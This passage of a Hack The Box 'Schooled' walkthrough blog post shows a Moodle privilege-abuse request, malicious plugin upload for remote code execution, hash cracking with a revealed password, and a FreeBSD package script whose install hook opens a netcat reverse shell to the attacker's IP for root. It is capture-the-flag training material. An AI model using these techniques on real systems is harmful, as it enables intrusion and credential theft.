2Fworkshop%3Amanageexamples=1&amp;mod%2Fworkshop%3Aoverridegrades=1&amp;mod%2Fworkshop%3Apeerassess=1&amp;mod%2Fworkshop%3Apublishsubmissions=1&amp;mod%2Fworkshop%3Asubmit=1&amp;mod%2Fworkshop%3Aswitchphase=1&amp;mod%2Fworkshop%3Aview=1&amp;mod%2Fworkshop%3Aviewallassessments=1&amp;mod%2Fworkshop%3Aviewallsubmissions=1&amp;mod%2Fworkshop%3Aviewauthornames=1&amp;mod%2Fworkshop%3Aviewauthorpublished=1&amp;mod%2Fworkshop%3Aviewpublishedsubmissions=1&amp;mod%2Fworkshop%3Aviewreviewernames=1&amp;moodle%2Fbackup%3Abackupactivity=1&amp;moodle%2Fcompetency%3Acoursecompetencyconfigure=1&amp;moodle%2Fcourse%3Aactivityvisibility=1&amp;moodle%2Fcourse%3Aignoreavailabilityrestrictions=1&amp;moodle%2Fcourse%3Amanageactivities=1&amp;moodle%2Fcourse%3Atogglecompletion=1&amp;moodle%2Fcourse%3Aviewhiddenactivities=1&amp;moodle%2Fh5p%3Adeploy=1&amp;moodle%2Fh5p%3Asetdisplayoptions=1&amp;moodle%2Fh5p%3Aupdatelibraries=1&amp;moodle%2Fsite%3Aaccessallgroups=1&amp;moodle%2Fsite%3Amanagecontextlocks=1&amp;moodle%2Fsite%3Atrustcontent=1&amp;moodle%2Fsite%3Aviewanonymousevents=1&amp;moodle%2Fsite%3Aviewfullnames=1&amp;moodle%2Fsite%3Aviewuseridentity=1&amp;quiz%2Fgrading%3Aviewidnumber=1&amp;quiz%2Fgrading%3Aviewstudentnames=1&amp;quiz%2Fstatistics%3Aview=1&amp;quizaccess%2Fseb%3Abypassseb=1&amp;quizaccess%2Fseb%3Amanage_filemanager_sebconfigfile=1&amp;quizaccess%2Fseb%3Amanage_seb_activateurlfiltering=1&amp;quizaccess%2Fseb%3Amanage_seb_allowedbrowserexamkeys=1&amp;quizaccess%2Fseb%3Amanage_seb_allowreloadinexam=1&amp;quizaccess%2Fseb%3Amanage_seb_allowspellchecking=1&amp;quizaccess%2Fseb%3Amanage_seb_allowuserquitseb=1&amp;quizaccess%2Fseb%3Amanage_seb_enableaudiocontrol=1&amp;quizaccess%2Fseb%3Amanage_seb_expressionsallowed=1&amp;quizaccess%2Fseb%3Amanage_seb_expressionsblocked=1&amp;quizaccess%2Fseb%3Amanage_seb_filterembeddedcontent=1&amp;quizaccess%2Fseb%3Amanage_seb_linkquitseb=1&amp;quizaccess%2Fseb%3Amanage_seb_muteonstartup=1&amp;quizaccess%2Fseb%3Amanage_seb_quitpassword=1&amp;quizaccess%2Fseb%3Amanage_seb_regexallowed=1&amp;quizaccess%2Fseb%3Amanage_seb_regexblocked=1&amp;quizaccess%2Fseb%3Amanage_seb_requiresafeexambrowser=1&amp;quizaccess%2Fseb%3Amanage_seb_showkeyboardlayout=1&amp;quizaccess%2Fseb%3Amanage_seb_showreloadbutton=1&amp;quizaccess%2Fseb%3Amanage_seb_showsebdownloadlink=1&amp;quizaccess%2Fseb%3Amanage_seb_showsebtaskbar=1&amp;quizaccess%2Fseb%3Amanage_seb_showtime=1&amp;quizaccess%2Fseb%3Amanage_seb_showwificontrol=1&amp;quizaccess%2Fseb%3Amanage_seb_templateid=1&amp;quizaccess%2Fseb%3Amanage_seb_userconfirmquit=1&amp;repository%2Fareafiles%3Aview=1&amp;repository%2Fboxnet%3Aview=1&amp;repository%2Fcontentbank%3Aview=1&amp;repository%2Fcoursefiles%3Aview=1&amp;repository%2Fdropbox%3Aview=1&amp;repository%2Fequella%3Aview=1&amp;repository%2Ffilesystem%3Aview=1&amp;repository%2Fflickr%3Aview=1&amp;repository%2Fflickr_public%3Aview=1&amp;repository%2Fgoogledocs%3Aview=1&amp;repository%2Flocal%3Aview=1&amp;repository%2Fmerlot%3Aview=0&amp;repository%2Fnextcloud%3Aview=1&amp;repository%2Fonedrive%3Aview=1&amp;repository%2Fpicasa%3Aview=1&amp;repository%2Frecent%3Aview=1&amp;repository%2Fs3%3Aview=1&amp;repository%2Fskydrive%3Aview=1&amp;repository%2Fupload%3Aview=1&amp;repository%2Furl%3Aview=1&amp;repository%2Fuser%3Aview=1&amp;repository%2Fwebdav%3Aview=1&amp;repository%2Fwikimedia%3Aview=1&amp;repository%2Fyoutube%3Aview=1&amp;block%2Factivity_modules%3Aaddinstance=1&amp;block%2Factivity_results%3Aaddinstance=1&amp;block%2Fadmin_bookmarks%3Aaddinstance=1&amp;block%2Fbadges%3Aaddinstance=1&amp;block%2Fblog_menu%3Aaddinstance=1&amp;block%2Fblog_recent%3Aaddinstance=1&amp;block%2Fblog_tags%3Aaddinstance=1&amp;block%2Fcalendar_month%3Aaddinstance=1&amp;block%2Fcalendar_upcoming%3Aaddinstance=1&amp;block%2Fcomments%3Aaddinstance=1&amp;block%2Fcompletionstatus%3Aaddinstance=1&amp;block%2Fcourse_list%3Aaddinstance=1&amp;block%2Fcourse_summary%3Aaddinstance=1&amp;block%2Ffeedback%3Aaddinstance=1&amp;block%2Fglobalsearch%3Aaddinstance=1&amp;block%2Fglossary_random%3Aaddinstance=1&amp;block%2Fhtml%3Aaddinstance=1&amp;block%2Flogin%3Aaddinstance=1&amp;block%2Fmentees%3Aaddinstance=1&amp;block%2Fmnet_hosts%3Aaddinstance=1&amp;block%2Fmyprofile%3Aaddinstance=1&amp;block%2Fnavigation%3Aaddinstance=1&amp;block%2Fnews_items%3Aaddinstance=1&amp;block%2Fonline_users%3Aaddinstance=1&amp;block%2Fonline_users%3Aviewlist=1&amp;block%2Fprivate_files%3Aaddinstance=1&amp;block%2Fquiz_results%3Aaddinstance=1&amp;block%2Frecent_activity%3Aaddinstance=1&amp;block%2Frss_client%3Aaddinstance=1&amp;block%2Frss_client%3Amanageanyfeeds=1&amp;block%2Frss_client%3Amanageownfeeds=1&amp;block%2Fsearch_forums%3Aaddinstance=1&amp;block%2Fsection_links%3Aaddinstance=1&amp;block%2Fselfcompletion%3Aaddinstance=1&amp;block%2Fsettings%3Aaddinstance=1&amp;block%2Fsite_main_menu%3Aaddinstance=1&amp;block%2Fsocial_activities%3Aaddinstance=1&amp;block%2Ftag_flickr%3Aaddinstance=1&amp;block%2Ftag_youtube%3Aaddinstance=1&amp;block%2Ftags%3Aaddinstance=1&amp;moodle%2Fblock%3Aedit=1&amp;moodle%2Fblock%3Aview=1&amp;moodle%2Fsite%3Amanageblocks=1&amp;savechanges=Save+changes</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<p>Paste in the intercepted request in burp</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1919.jpg"></li>
+</ul>
+<p>Forward the request</p>
+<p>Upload Payload to get shell</p>
+<p>Now its time to get reverse shell</p>
+<p>RCE can be achieved by uploading into plugin section and calling the Plugin from browser to get shell</p>
+<p>Lets begin</p>
+<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><p>Upload Plugin</p>
+<p>Location of Plugin</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1920.jpg"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1921.jpg"></p>
+</li>
+</ul>
+<p>Malicious Plugin can be downloaded from <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0hvYW5nS2llbjEwMjAvTW9vZGxlX1JDRQ==">Moodle_RCE<i class="fa fa-external-link-alt"></i></span></p>
+<p>unzip it and put <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BlbnRlc3Rtb25rZXkvcGhwLXJldmVyc2Utc2hlbGwvYmxvYi9tYXN0ZXIvcGhwLXJldmVyc2Utc2hlbGwucGhw">php-reverse-shell<i class="fa fa-external-link-alt"></i></span></p>
+<p>change the IP and PORT</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1922.jpg"></li>
+</ul>
+<p>Upload the plugin</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1923.jpg"></li>
+</ul>
+<p>and start a listen on netcat</p>
+<p>and start a listen on netcat</p>
+<p>RCE Intial Shell</p>
+<h3 id="Trigger-RCE"><a href="#Trigger-RCE" class="headerlink" title="Trigger RCE"></a>Trigger RCE</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">domain/blocks/rce/lang/en/block_rce.php?cmd=<span class="built_in">id</span>*</span><br></pre></td></tr></table></figure>
+
+<p>we got shell </p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1924.jpg"></li>
+</ul>
+<p>Mysql Creds</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1925.jpg"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1926.jpg"></p>
+</li>
+</ul>
+<p>Jamie(admin) Hash </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$2y$10<span class="variable">$3D</span>/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW</span><br></pre></td></tr></table></figure>
+
+<p>crack via john</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john <span class="built_in">hash</span> -w=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>already cracked it take few minutes depend on your pc<br>So Jamie password is ‘!QAZ2wsx’</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jamie@Schooled:~ $ <span class="built_in">id</span></span><br><span class="line">uid=1001(jamie) gid=1001(jamie) <span class="built_in">groups</span>=1001(jamie),0(wheel)</span><br><span class="line">jamie@Schooled:~ $ <span class="built_in">whoami</span></span><br><span class="line">jamie</span><br><span class="line">jamie@Schooled:~ $ <span class="built_in">cat</span> user.txt</span><br><span class="line">39a50aff4788e4486058408e4ab91bd1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1927.jpg"></li>
+</ul>
+<h3 id="privilege-esclation"><a href="#privilege-esclation" class="headerlink" title="privilege esclation"></a>privilege esclation</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jamie@Schooled:~ $ sudo -l</span><br><span class="line">User jamie may run the following commands on Schooled:</span><br><span class="line">    (ALL) NOPASSWD: /usr/sbin/pkg update</span><br><span class="line">    (ALL) NOPASSWD: /usr/sbin/pkg install *</span><br></pre></td></tr></table></figure>
+
+<p>Here is the some reference for privilleged escalation </p>
+<ul>
+<li><span class="exturl" data-url="aHR0cDovL2xhc3RzdW1tZXIuZGUvY3JlYXRpbmctY3VzdG9tLXBhY2thZ2VzLW9uLWZyZWVic2Qv">Creating Custom Packages on FreeBSD<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>Here is the script for root</p>
+<ul>
+<li>exp.sh</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">STAGEDIR=/tmp/package</span><br><span class="line"><span class="built_in">rm</span> -rf <span class="variable">$&#123;STAGEDIR&#125;</span></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="variable">$&#123;STAGEDIR&#125;</span></span><br><span class="line"><span class="built_in">cat</span> &gt;&gt; <span class="variable">$&#123;STAGEDIR&#125;</span>/+PRE_INSTALL &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string"># careful here, this may clobber your system</span></span><br><span class="line"><span class="string">echo “Resetting root shell”</span></span><br><span class="line"><span class="string">rm /tmp/a;mkfifo /tmp/a;cat /tmp/a|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.7 9080 &gt;/tmp/a</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">cat</span> &gt;&gt; <span class="variable">$&#123;STAGEDIR&#125;</span>/+POST_INSTALL &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string"># careful here, this may clobber your system</span></span><br><span class="line"><span class="string">echo “Registering root shell”</span></span><br><span class="line"><span class="string">pw usermod -n root -s /bin/sh</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">cat</span> &gt;&gt; <span class="variable">$&#123;STAGEDIR&#125;</span>/+MANIFEST &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">name: mypackage</span></span><br><span class="line"><span class="string">version: “1.0_5”</span></span><br><span class="line"><span class="string">origin: sysutils/mypackage</span></span><br><span class="line"><span class="string">comment: “automates stuff”</span></span><br><span class="line"><span class="string">desc: “automates tasks which can also be undone later”</span></span><br><span class="line"><span class="string">maintainer: john@doe.it</span></span><br><span class="line"><span class="string">www: https://doe.it</span></span><br><span class="line"><span class="string">prefix: /</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">pkg create -m <span class="variable">$&#123;STAGEDIR&#125;</span>/ -r <span class="variable">$&#123;STAGEDIR&#125;</span>/ -o .</span><br></pre></td></tr></table></figure>
+
+<p>Run the script on victim (jamie) machine,  run this command</p>
+<p>and we got root</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">jamie@Schooled:~ $ <span class="built_in">chmod</span> +x exploit.sh </span><br><span class="line">jamie@Schooled:~ $ ./exploit.sh </span><br><span class="line">jamie@Schooled:~ $ <span class="built_in">ls</span></span><br><span class="line">exploit.sh                      mypackage-“1.0_5”.txz           user.txt</span><br><span class="line">jamie@Schooled:~ $ sudo pkg install --no-repo-update *.txz</span><br><span class="line">pkg: Repository FreeBSD has a wrong packagesite, need to re-create database</span><br><span class="line">pkg: Repository FreeBSD cannot be opened. <span class="string">&#x27;pkg update&#x27;</span> required</span><br><span class="line">Checking integrity... <span class="keyword">done</span> (0 conflicting)</span><br><span class="line">The following 1 package(s) will be affected (of 0 checked):</span><br><span class="line"></span><br><span class="line">New packages to be INSTALLED:</span><br><span class="line">        mypackage: “1.0_5”</span><br><span class="line"></span><br><span class="line">Number of packages to be installed: 1</span><br><span class="line"></span><br><span class="line">Proceed with this action? [y/N]: y</span><br><span class="line">[1/1] Installing mypackage-“1.0_5”...</span><br><span class="line">“Resetting root shell”</span><br><span class="line"><span class="built_in">rm</span>: /tmp/a: No such file or directory</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/schooled]</span><br><span class="line">└─<span class="comment"># nc -lvp 9080</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9080</span><br><span class="line">Ncat: Listening on 0.0.0.0:9080</span><br><span class="line">Ncat: Connection from 10.10.10.234.</span><br><span class="line">Ncat: Connection from 10.10.10.234:38734.</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(wheel) <span class="built_in">groups</span>=0(wheel),5(operator)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">58c6281b0eddaff94df2d1e96b6e2520</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1928.jpg"></li>
+</ul>
+<h3 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h3><ul>
+<li>use ffuf to bruteforce subdomains</li>
+<li>reflect xss to get teacher’s cookie</li>
+<li>CVE-2020-14321 RCE to get a reverse shell</li>
+<li>Creating Custom Packages on FreeBSD to privilleged escalation</li>
+</ul>
+<h3 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h3><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2021/04/09/schooled/" title="Hack-The-Box-walkthrough[schooled]">https://fdlucifer.github.io/2021/04/09/schooled/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/03/29/Armageddon/" rel="prev" title="Hack-The-Box-walkthrough[Armageddon]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[Armageddon]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/04/23/Unobtainium/" rel="next" title="Hack-The-Box-walkthrough[Unobtainium]">
+                  Hack-The-Box-walkthrough[Unobtainium] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
